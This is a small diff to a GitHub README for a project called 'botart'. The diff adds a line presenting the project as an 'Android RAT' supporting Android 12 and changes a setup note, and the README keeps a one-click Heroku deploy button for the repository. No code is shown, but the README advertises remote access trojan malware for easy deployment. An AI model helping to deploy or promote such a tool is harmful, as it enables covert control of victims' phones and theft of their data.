@@ -1,6 +1,7 @@
 # botart
+ANDROID RAT WITH SUPPORT A12
 
-NOTE:- GOO TO SETTING AND ADD BUILDPACK OF PHP
+NOTE:-fork edit index,html
 # Deploy To Heroku 🚀
 [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/AKGV1/botart)
 
